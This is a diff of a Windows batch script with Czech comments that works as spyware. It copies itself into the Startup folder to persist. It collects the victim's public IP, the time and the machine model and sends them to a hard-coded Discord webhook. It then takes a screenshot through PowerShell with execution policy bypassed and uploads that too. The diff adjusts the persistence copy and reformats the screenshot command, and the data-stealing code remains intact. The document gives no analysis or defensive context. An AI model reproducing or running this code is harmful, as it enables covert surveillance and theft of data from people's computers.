@@ -9,7 +9,7 @@ set "webhook=https://discord.com/api/webhooks/1439411134137499698/1LxkdwQcxAxk-N
 set "bootbat=%TEMP%\boot.bat"
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\boot.bat"
 if not exist "%bootbat%" copy /y "%~f0" "%bootbat%" >nul
-if not exist "%startup%" copy /y "%~f0" "%startup%" >nul
+if not exist "%startup%" copy /y "%bootbat%" "%startup%" >nul
 
 :: 🌍 IP + uživatel
 for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
@@ -41,7 +41,7 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
     )
 )
 
-:: 🧾 Zpráva – každá položka na novém řádku, IP s || před i za
+:: 🧾 Zpráva – každý řádek zvlášť, IP s || před i za
 set "msg=🛰️ **Systémové info:**^
 IP: ||!ip! ||^
 Čas: !timestamp!^
@@ -54,7 +54,14 @@ curl -s -X POST %webhook% -d "content=!msg!" >nul
 
 :: 📸 Screenshot
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
-powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
+powershell -ExecutionPolicy Bypass -Command ^
+"Add-Type -AssemblyName System.Windows.Forms; ^
+Add-Type -AssemblyName System.Drawing; ^
+$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
+$bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; ^
+$graphics = [Drawing.Graphics]::FromImage($bmp); ^
+$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); ^
+$bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
 
 if exist "%ss%" (
     curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
